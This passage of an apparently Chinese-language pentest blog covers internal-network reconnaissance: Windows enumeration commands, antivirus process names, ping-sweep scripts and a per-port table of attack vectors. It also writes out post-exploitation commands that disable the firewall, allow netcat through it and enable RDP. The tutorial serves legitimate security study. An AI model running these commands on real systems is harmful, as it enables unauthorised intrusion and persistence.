class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1. ç½‘ç»œé…ç½®</span></span><br><span class="line">ipconfig /all</span><br><span class="line"><span class="meta">#</span><span class="bash"> 2. æ“ä½œç³»ç»ŸåŠè½¯ä»¶ä¿¡æ¯</span></span><br><span class="line">systeminfo  # ç‰ˆæœ¬ä¿¡æ¯</span><br><span class="line">echo %PROCESSOR_ARCHITECTURE%  # ä½“ç³»ç»“æ„</span><br><span class="line">wmic product get name,version  # åˆ©ç”¨ wmic,  å‚è€ƒ https://blog.csdn.net/discover2210212455/article/details/82711930</span><br><span class="line">powershell &quot;&quot; # https://docs.microsoft.com/zh-cn/powershell/scripting/samples/collecting-information-about-computers?view=powershell-7.1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 3. æœ¬æœºæœåŠ¡ä¿¡æ¯</span></span><br><span class="line">wmic service list brief</span><br><span class="line"><span class="meta">#</span><span class="bash"> 4. è¿›ç¨‹åˆ—è¡¨</span></span><br><span class="line">tasklist</span><br><span class="line">wmic process list brief</span><br><span class="line"><span class="meta">#</span><span class="bash"> 5. å¯åŠ¨ç¨‹åºä¿¡æ¯</span></span><br><span class="line">wmic startup get command,caption</span><br><span class="line"><span class="meta">#</span><span class="bash"> 6. è®¡åˆ’ä»»åŠ¡</span></span><br><span class="line">schtasks /query /fo LIST /v  # å¿…é¡»è¦æ˜¯ Administrator æ‰§è¡Œï¼Œä¸ç„¶ä¼šæŠ¥é”™</span><br><span class="line"><span class="meta">#</span><span class="bash"> 7. ä¸»æœºå¼€æœºæ—¶é—´</span></span><br><span class="line">net statistics workstation</span><br><span class="line"><span class="meta">#</span><span class="bash"> 8. æŸ¥è¯¢ç”¨æˆ·åˆ—è¡¨</span></span><br><span class="line">net user  # æœ¬æœºç”¨æˆ·åˆ—è¡¨</span><br><span class="line">net localgroup administrators  # æœ¬åœ°ç®¡ç†å‘˜ä¿¡æ¯ï¼ˆé€šå¸¸åŒ…å«åŸŸç”¨æˆ·ï¼‰</span><br><span class="line">query user || qwinsta  # æŸ¥çœ‹å½“å‰åœ¨çº¿ç”¨æˆ·</span><br><span class="line"><span class="meta">#</span><span class="bash"> 9. åˆ—å‡ºæˆ–æ–­å¼€æœ¬åœ°è®¡ç®—æœºä¸æ‰€è¿æ¥å¾—å®¢æˆ·ç«¯ä¹‹é—´çš„ä¼šè¯</span></span><br><span class="line">net session</span><br><span class="line"><span class="meta">#</span><span class="bash"> 10. æŸ¥è¯¢ç«¯å£åˆ—è¡¨</span></span><br><span class="line">netstat -ano</span><br><span class="line"><span class="meta">#</span><span class="bash"> 11. è¡¥ä¸åˆ—è¡¨</span></span><br><span class="line">systeminfo</span><br><span class="line">wmic qfe get caption,description,hotfixid,installedon</span><br><span class="line"><span class="meta">#</span><span class="bash"> 12. æœ¬æœºå…±äº«åˆ—è¡¨</span></span><br><span class="line">net share</span><br><span class="line">wmic share get name,path,status</span><br><span class="line"><span class="meta">#</span><span class="bash"> 13. è·¯ç”±è¡¨åŠæ‰€æœ‰å¯ç”¨æ¥å£çš„ ARP ç¼“å­˜è¡¨</span></span><br><span class="line">route print</span><br><span class="line">arp -a</span><br><span class="line"><span class="meta">#</span><span class="bash"> 14. é˜²ç«å¢™ç›¸å…³é…ç½®</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># (1) å…³é—­é˜²ç«å¢™</span></span></span><br><span class="line">netsh firewall set opmode disable  # Windows Server 2003 åŠä¹‹å‰çš„ç‰ˆæœ¬</span><br><span class="line">netsh advfirewall set allprofiles state off  # Windows Server 2003 ä¹‹åçš„ç‰ˆæœ¬</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># (2) é˜²ç«å¢™é…ç½®</span></span></span><br><span class="line">netsh firewall show config</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># (3) ä¿®æ”¹é˜²ç«å¢™é…ç½®</span></span></span><br><span class="line">netsh firewall add allowedprogram C:\nc.exe &quot;allow nc&quot; enable  # Windows Server 2003 åŠä¹‹å‰çš„ç‰ˆæœ¬ï¼Œå…è®¸æŒ‡å®šç¨‹åºå…¨éƒ¨è¿æ¥</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\nc.exe&quot;  # Windows Server 2003 ä¹‹åçš„ç‰ˆæœ¬ï¼Œå…è®¸æŒ‡å®šç¨‹åºè¿›å…¥</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;allow nc&quot; dir=out action=allow program=&quot;C:\nc.exe&quot;  # åŒä¸Šï¼Œå…è®¸æŒ‡å®šç¨‹åºé€€å‡º</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow  # åŒä¸Šï¼Œå…è®¸ 3389 ç«¯å£æ”¾è¡Œ</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># (4) è‡ªå®šä¹‰é˜²ç«å¢™æ—¥å¿—çš„å‚¨å­˜ä½ç½®</span></span></span><br><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\shit.log&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 15. ä»£ç†é…ç½®æƒ…å†µ</span></span><br><span class="line">reg query &quot;HKEY_CURRENT_USER\SoftWare\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 16. æŸ¥è¯¢å¹¶å¼€å¯è¿œç¨‹è¿æ¥æœåŠ¡</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># (1) æŸ¥çœ‹è¿œç¨‹è¿æ¥ç«¯å£</span></span></span><br><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber  # ç»“æœä¸º 0xd3dï¼Œè½¬æ¢åä¸º 3389</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># (2) åœ¨ Windows Server 2003 ä¸­å¼€å¯ 3389 ç«¯å£</span></span></span><br><span class="line">wmic path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># (3) åœ¨ Windows Server 2008 å’Œ Windows Server 2012 ä¸­å¼€å¯ 3389 ç«¯å£</span></span></span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1</span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName = &#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1</span><br><span class="line">req add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure><h4 id="å¸¸è§æ€æ¯’è½¯ä»¶è¿›ç¨‹"><a href="#å¸¸è§æ€æ¯’è½¯ä»¶è¿›ç¨‹" class="headerlink" title="å¸¸è§æ€æ¯’è½¯ä»¶è¿›ç¨‹"></a>å¸¸è§æ€æ¯’è½¯ä»¶è¿›ç¨‹</h4><table><thead><tr><th>è¿›ç¨‹</th><th>è½¯ä»¶åç§°</th></tr></thead><tbody><tr><td>360sd.exe</td><td>360æ€æ¯’</td></tr><tr><td>360tray.exe</td><td>360å®æ—¶ä¿æŠ¤</td></tr><tr><td>ZhuDongFangYu.exe</td><td>360ä¸»åŠ¨é˜²å¾¡</td></tr><tr><td>KSafeTray.exe</td><td>é‡‘å±±å«å£«</td></tr><tr><td>SafeDogUpdateCenter.exe</td><td>æœåŠ¡å™¨å®‰å…¨ç‹—</td></tr><tr><td>McAfree McShield.exe</td><td>McAfee</td></tr><tr><td>egui.exe</td><td>NOD32</td></tr><tr><td>AVP.EXE</td><td>å¡å·´æ–¯åŸº</td></tr><tr><td>avguard.exe</td><td>å°çº¢ä¼</td></tr><tr><td>bdagent.exe</td><td>BitDefender</td></tr></tbody></table><h4 id="WMIC-è„šæœ¬è‡ªåŠ¨æ”¶é›†ä¿¡æ¯"><a href="#WMIC-è„šæœ¬è‡ªåŠ¨æ”¶é›†ä¿¡æ¯" class="headerlink" title="WMIC è„šæœ¬è‡ªåŠ¨æ”¶é›†ä¿¡æ¯"></a>WMIC è„šæœ¬è‡ªåŠ¨æ”¶é›†ä¿¡æ¯</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">for /f &quot;delims=&quot; %%A in (&#x27;dir /s /b %WINDIR%\system32\*htable.xsl&#x27;) do set &quot;var=%%A&quot;</span><br><span class="line"></span><br><span class="line">wmic process get CSName,Description,ExecutablePath,ProcessId /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic USERACCOUNT list full /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic group list full /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic nicconfig where IPEnabled=&#x27;true&#x27; get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /format:&quot;%var%&quot; &gt;&gt; Du1L0v3_WMIC_out.html</span><br><span class="line">wmic volume get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic netuse list full /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic startup get Caption,Command,Location,User /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,SystemDirectory /format:&quot;%var%&quot; &gt;&gt; out.html</span><br><span class="line">wmic Timezone get DaylightName,Description,StandardName /format:&quot;%var%&quot; &gt;&gt; out.html</span><br></pre></td></tr></table></figure><h3 id="æŸ¥è¯¢å½“å‰æƒé™"><a href="#æŸ¥è¯¢å½“å‰æƒé™" class="headerlink" title="æŸ¥è¯¢å½“å‰æƒé™"></a>æŸ¥è¯¢å½“å‰æƒé™</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami  # å½“å‰æƒé™</span><br><span class="line">whoami /all  # è·å–åŸŸ SID</span><br><span class="line">net user XXX /domain  # æŒ‡å®šç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯</span><br></pre></td></tr></table></figure><h3 id="åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ"><a href="#åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ" class="headerlink" title="åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ"></a>åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br><span class="line">nslookup xxxx.xxxx  # åå‘è§£ææŸ¥è¯¢æ¥åˆ¤æ–­åŸŸæ§å’ŒDNSæ˜¯å¦åœ¨åŒä¸€æœåŠ¡å™¨ä¸Š</span><br><span class="line"><span class="meta">#</span><span class="bash"> ä¿¡æ¯</span></span><br><span class="line">systeminfo</span><br><span class="line">net config workstation</span><br><span class="line"><span class="meta">#</span><span class="bash"> åˆ¤æ–­ä¸»åŸŸ</span></span><br><span class="line">net time /domain</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 1. å­˜åœ¨åŸŸä½†å½“å‰ç”¨æˆ·ä¸æ˜¯åŸŸç”¨æˆ·ï¼Œä¼šæŠ¥é”™ &quot;ç³»ç»Ÿé”™è¯¯5 æ‹’ç»è®¿é—®&quot;</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 2. å­˜åœ¨åŸŸä¸”å½“å‰ç”¨æˆ·æ˜¯åŸŸç”¨æˆ·ï¼Œåˆ™æˆåŠŸå®Œæˆå‘½ä»¤</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 3. å½“å‰ç½‘ç»œç¯å¢ƒä¸ºå·¥ä½œç»„ï¼Œä¸å­˜åœ¨åŸŸï¼Œåˆ™ä¼šæŠ¥é”™ &quot;æ‰¾ä¸åˆ°åŸŸ WORKGROUP çš„åŸŸæ§åˆ¶å™¨&quot;</span></span></span><br></pre></td></tr></table></figure><h3 id="æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº"><a href="#æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº" class="headerlink" title="æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº"></a>æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº</h3><p>å¯ä»¥åˆ†æ—¶é—´æ®µè¿›è¡Œæ¢æµ‹ï¼Œä»¥å¯¹æ¯”å­˜æ´»ä¸»æœºåŠå¯¹åº”çš„ IP</p><h4 id="NetBIOS-å¿«é€Ÿæ¢æµ‹å†…ç½‘"><a href="#NetBIOS-å¿«é€Ÿæ¢æµ‹å†…ç½‘" class="headerlink" title="NetBIOS å¿«é€Ÿæ¢æµ‹å†…ç½‘"></a>NetBIOS å¿«é€Ÿæ¢æµ‹å†…ç½‘</h4><p>NetBIOS æ˜¯å±€åŸŸç½‘ç¨‹åºä½¿ç”¨çš„ä¸€ç§åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£</p><p>nbtscan æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºæ‰«ææœ¬åœ°æˆ–è¿œç¨‹ TCP/IP ç½‘ç»œä¸Šçš„å¼€æ”¾ NetBIOS åç§°æœåŠ¡å™¨ï¼Œå°†å…¶ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºä¸­ï¼Œè¾“å…¥ IP åœ°å€èŒƒå›´å¹¶è¿è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan.exe 192.168.1.0/24</span><br></pre></td></tr></table></figure><h5 id="å‚æ•°è¯´æ˜"><a href="#å‚æ•°è¯´æ˜" class="headerlink" title="å‚æ•°è¯´æ˜"></a>å‚æ•°è¯´æ˜</h5><table><thead><tr><th>Token</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>SHARING</td><td>è¯¥æœºå™¨ä¸­å­˜åœ¨æ­£åœ¨è¿è¡Œçš„æ–‡ä»¶å’Œæ‰“å°å…±äº«æœåŠ¡ï¼Œä½†ä¸ä¸€å®šæœ‰å†…å®¹å…±äº«</td></tr><tr><td>DC</td><td>è¯¥æœºå™¨å¯èƒ½æ˜¯åŸŸæ§</td></tr><tr><td>U=USER</td><td>è¯¥æœºå™¨ä¸­æœ‰ç™»å½•åä¸º User çš„ç”¨æˆ·ï¼ˆä¸å¤ªå‡†ç¡®</td></tr><tr><td>IIS</td><td>è¯¥æœºå™¨ä¸­å¯èƒ½å®‰è£…äº† IIS æœåŠ¡å™¨</td></tr><tr><td>EXCHANGE</td><td>è¯¥æœºå™¨ä¸­å¯èƒ½å®‰è£…äº† Exchange</td></tr><tr><td>NORTTES</td><td>è¯¥æœºå™¨ä¸­å¯èƒ½å®‰è£…äº† Lotus Notes ç”µå­é‚®ä»¶å®¢æˆ·ç«¯</td></tr><tr><td>ï¼Ÿ</td><td>æ²¡æœ‰è¯†åˆ«å‡ºè¯¥æœºå™¨çš„ NetBIOS èµ„æºï¼ˆå¯ä»¥ä½¿ç”¨ -F é€‰é¡¹å†æ¬¡æ‰«æ</td></tr></tbody></table><h4 id="ICMP-åè®®å¿«é€Ÿæ¢æµ‹å†…ç½‘"><a href="#ICMP-åè®®å¿«é€Ÿæ¢æµ‹å†…ç½‘" class="headerlink" title="ICMP åè®®å¿«é€Ÿæ¢æµ‹å†…ç½‘"></a>ICMP åè®®å¿«é€Ÿæ¢æµ‹å†…ç½‘</h4><p>ä¾æ¬¡å¯¹å†…ç½‘ä¸­çš„æ¯ä¸ª IP æ‰§è¡Œ ping å‘½ä»¤ï¼Œå¯ä»¥å¿«é€Ÿæ‰¾å‡ºå†…ç½‘ä¸­æ‰€æœ‰å­˜æ´»çš„ä¸»æœºï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¾ªç¯æ¢æµ‹æ•´ä¸ª C æ®µ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL=&quot;</span><br></pre></td></tr></table></figure><p>VBS è„šæœ¬</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">strSubNet = <span class="string">&quot;192.168.1.&quot;</span></span><br><span class="line"><span class="keyword">Set</span> objFSO = <span class="built_in">CreateObject</span>(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> objTS = objfso.CreateTextFile(<span class="string">&quot;C:\Windows\Temp\Result.txt&quot;</span>)</span><br><span class="line"><span class="keyword">For</span> i = <span class="number">1</span> <span class="keyword">To</span> <span class="number">254</span></span><br><span class="line">strComputer = strSubNet &amp; i</span><br><span class="line">blnResult = Ping(strComputer)</span><br><span class="line"><span class="keyword">If</span> blnResult = <span class="literal">True</span> <span class="keyword">Then</span></span><br><span class="line">objTS.WriteLine strComputer &amp; <span class="string">&quot; is alived :)&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line">objTS.Close</span><br><span class="line">WScript.Echo <span class="string">&quot;All Ping Scan, All Done :)&quot;</span></span><br><span class="line"><span class="keyword">Function</span> Ping(strComputer)</span><br><span class="line"><span class="keyword">Set</span> objWMIService = <span class="built_in">GetObject</span>(<span class="string">&quot;winmgmts:\\.\root\cimv2&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> colItems = objWMIService.ExecQuery(<span class="string">&quot;Select * From Win32_PingStatus Where Address=&#x27;&quot;</span> &amp; strComputer &amp; <span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line"><span class="keyword">For</span> <span class="keyword">Each</span> objItem <span class="keyword">In</span> colItems</span><br><span class="line"><span class="keyword">Select</span> <span class="keyword">case</span> objItem.statusCode</span><br><span class="line"><span class="keyword">Case</span> <span class="number">0</span></span><br><span class="line">Ping = <span class="literal">True</span></span><br><span class="line"><span class="keyword">Case</span> <span class="keyword">Else</span></span><br><span class="line">Ping = <span class="literal">False</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">select</span></span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure><p>Shell è„šæœ¬</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">for i in &#123;1..254&#125;;do</span><br><span class="line">&#123;</span><br><span class="line">ping -c1 -W1 10.10.1.$i &amp;&amp; echo &quot;10.10.1.$i&quot; is alive;</span><br><span class="line">&#125;&amp;</span><br><span class="line">done</span><br><span class="line">wait</span><br></pre></td></tr></table></figure><h4 id="ARP-æ‰«ææ¢æµ‹å†…ç½‘"><a href="#ARP-æ‰«ææ¢æµ‹å†…ç½‘" class="headerlink" title="ARP æ‰«ææ¢æµ‹å†…ç½‘"></a>ARP æ‰«ææ¢æµ‹å†…ç½‘</h4><ul><li>arp-scan</li><li>Empire çš„ arpscan æ¨¡å—</li><li>Nishang çš„ Invoke-ARPScan.ps1 è„šæœ¬</li></ul><h4 id="å¸¸è§„-TCP-UDP-ç«¯å£æ‰«ææ¢æµ‹å†…ç½‘"><a href="#å¸¸è§„-TCP-UDP-ç«¯å£æ‰«ææ¢æµ‹å†…ç½‘" class="headerlink" title="å¸¸è§„ TCP/UDP ç«¯å£æ‰«ææ¢æµ‹å†…ç½‘"></a>å¸¸è§„ TCP/UDP ç«¯å£æ‰«ææ¢æµ‹å†…ç½‘</h4><p>ScanLine</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scanline -h -t 22,80-89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,5432 -u 53,161,137,139 -O log.txt -p 192.168.1.1-254 /b</span><br></pre></td></tr></table></figure><h3 id="æ‰«æåŸŸå†…ç«¯å£"><a href="#æ‰«æåŸŸå†…ç«¯å£" class="headerlink" title="æ‰«æåŸŸå†…ç«¯å£"></a>æ‰«æåŸŸå†…ç«¯å£</h3><ul><li>telnet</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet DC 22</span><br></pre></td></tr></table></figure><ul><li>S æ‰«æå™¨</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S.exe TCP 192.168.1.1 192.168.1.254 445,3389,1433,7001,1099,8080,80,22,23,21,25,110,3306,5432,1521,6379,2049,111 256 /Banner /save</span><br></pre></td></tr></table></figure><ul><li>PowerSploit çš„ Invoke-portscan.ps1 è„šæœ¬</li><li>Nishang çš„ Invoke-PortScan.ps1 è„šæœ¬</li></ul><h4 id="ç«¯å£-Banner-ä¿¡æ¯"><a href="#ç«¯å£-Banner-ä¿¡æ¯" class="headerlink" title="ç«¯å£ Banner ä¿¡æ¯"></a>ç«¯å£ Banner ä¿¡æ¯</h4><ul><li><code>å®‰å…¨ç„¦ç‚¹</code>ï¼š<a href="http://www.securityfocus.com/bid">http://www.securityfocus.com/bid</a></li><li><code>Exploit-DB</code>ï¼š<a href="https://www.exploit-db.com/">Exploit Database - Exploits for Penetration Testers, Researchers, and Ethical Hackers (exploit-db.com)</a></li></ul><h5 id="å¸¸è§ç«¯å£åŠè¯´æ˜"><a href="#å¸¸è§ç«¯å£åŠè¯´æ˜" class="headerlink" title="å¸¸è§ç«¯å£åŠè¯´æ˜"></a>å¸¸è§ç«¯å£åŠè¯´æ˜</h5><ul><li>æ–‡ä»¶å…±äº«æœåŠ¡ç«¯å£</li></ul><table><thead><tr><th>ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th>ä½¿ç”¨è¯´æ˜</th></tr></thead><tbody><tr><td>21ã€22ã€69</td><td>FTP/TFTP æ–‡ä»¶ä¼ è¾“åè®®</td><td>å…è®¸åŒ¿åçš„ä¸Šä¼ ã€ä¸‹è½½ã€çˆ†ç ´å’Œå—…æ¢æ“ä½œ</td></tr><tr><td>2049</td><td>NFS æœåŠ¡</td><td>é…ç½®ä¸å½“</td></tr><tr><td>139</td><td>SAMBA æœåŠ¡</td><td>çˆ†ç ´ã€æœªæˆæƒè®¿é—®ã€è¿œç¨‹ä»£ç æ‰§è¡Œ</td></tr><tr><td>389</td><td>LDAP ç›®å½•è®¿é—®åè®®</td><td>æ³¨å…¥ã€å…è®¸åŒ¿åè®¿é—®ã€å¼±å£ä»¤</td></tr></tbody></table><ul><li>è¿œç¨‹è¿æ¥æœåŠ¡ç«¯å£</li></ul><table><thead><tr><th>ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th>ä½¿ç”¨è¯´æ˜</th></tr></thead><tbody><tr><td>22</td><td>SSH è¿œç¨‹è¿æ¥</td><td>çˆ†ç ´ã€SSH éš§é“åŠå†…ç½‘ä»£ç†è½¬å‘ã€æ–‡ä»¶ä¼ è¾“</td></tr><tr><td>23</td><td>Telnet è¿œç¨‹è¿æ¥</td><td>çˆ†ç ´ã€å—…æ¢ã€å¼±å£ä»¤</td></tr><tr><td>3389</td><td>RDP è¿œç¨‹æ¡Œé¢è¿æ¥</td><td>Shift åé—¨ï¼ˆWindows Server 2003 åŠä»¥ä¸‹ç‰ˆæœ¬ï¼‰ã€çˆ†ç ´</td></tr><tr><td>5900</td><td>VNC</td><td>å¼±å£ä»¤çˆ†ç ´</td></tr><tr><td>5632</td><td>PcAnywhere æœåŠ¡</td><td>æŠ“å–å¯†ç ã€ä»£ç æ‰§è¡Œ</td></tr></tbody></table><ul><li>Web åº”ç”¨æœåŠ¡ç«¯å£</li></ul><table><thead><tr><th>ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th>ä½¿ç”¨è¯´æ˜</th></tr></thead><tbody><tr><td>80ã€443ã€8080</td><td>å¸¸è§çš„ Web æœåŠ¡ç«¯å£</td><td>Web æ”»å‡»ã€çˆ†ç ´ã€å¯¹åº”æœåŠ¡å™¨ç‰ˆæœ¬æ¼æ´</td></tr><tr><td>7001ã€7002</td><td>WebLogic æ§åˆ¶å°</td><td>Java ååºåˆ—åŒ–ã€å¼±å£ä»¤</td></tr><tr><td>8080ã€8089</td><td>JBoss/Resin/Jetty/Jenkins</td><td>ååºåˆ—åŒ–ã€æ§åˆ¶å°å¼±å£ä»¤</td></tr><tr><td>9090</td><td>WebSphere æ§åˆ¶å°</td><td>Java ååºåˆ—åŒ–ã€å¼±å£ä»¤</td></tr><tr><td>4848</td><td>GlassFish æ§åˆ¶å°</td><td>å¼±å£ä»¤</td></tr><tr><td>1352</td><td>Lotus Domino é‚®ä»¶æœåŠ¡</td><td>å¼±å£ä»¤ã€ä¿¡æ¯æ³„éœ²ã€çˆ†ç ´</td></tr><tr><td>1000</td><td>webmin æ§åˆ¶é¢æ¿</td><td>å¼±å£ä»¤</td></tr></tbody></table><ul><li>æ•°æ®åº“æœåŠ¡ç«¯å£</li></ul><table><thead><tr><th>ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th>ä½¿ç”¨è¯´æ˜</th></tr></thead><tbody><tr><td>3306</td><td>MySQL æ•°æ®åº“</td><td>æ³¨å…¥ã€ææƒã€çˆ†ç ´</td></tr><tr><td>1433</td><td>MSSQL æ•°æ®åº“</td><td>æ³¨å…¥ã€ææƒã€SA å¼±å£ä»¤ã€çˆ†ç ´</td></tr><tr><td>1521</td><td>Oracle æ•°æ®åº“</td><td>TNS çˆ†ç ´ã€æ³¨å…¥ã€åå¼¹ SHELL</td></tr><tr><td>5432</td><td>PostgreSQL æ•°æ®åº“</td><td>çˆ†ç ´ã€æ³¨å…¥ã€å¼±å£ä»¤</td></tr><tr><td>27017ã€27018</td><td>MongoDB æ•°æ®åº“</td><td>çˆ†ç ´ã€æœªæˆæƒè®¿é—®</td></tr><tr><td>6379</td><td>Redis æ•°æ®åº“</td><td>å¯å°è¯•æœªæˆæƒè®¿é—®ã€å¼±å£ä»¤çˆ†ç ´</td></tr><tr><td>5000</td><td>Sysbase/DB2 æ•°æ®åº“</td><td>çˆ†ç ´ã€æ³¨å…¥</td></tr></tbody></table><ul><li>é‚®ä»¶æœåŠ¡ç«¯å£</li></ul><table><thead><tr><th>ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th>ä½¿ç”¨è¯´æ˜</th></tr></thead><tbody><tr><td>25</td><td>SMTP é‚®ä»¶æœåŠ¡</td><td>é‚®ä»¶ä¼ªé€ </td></tr><tr><td>110</td><td>POP 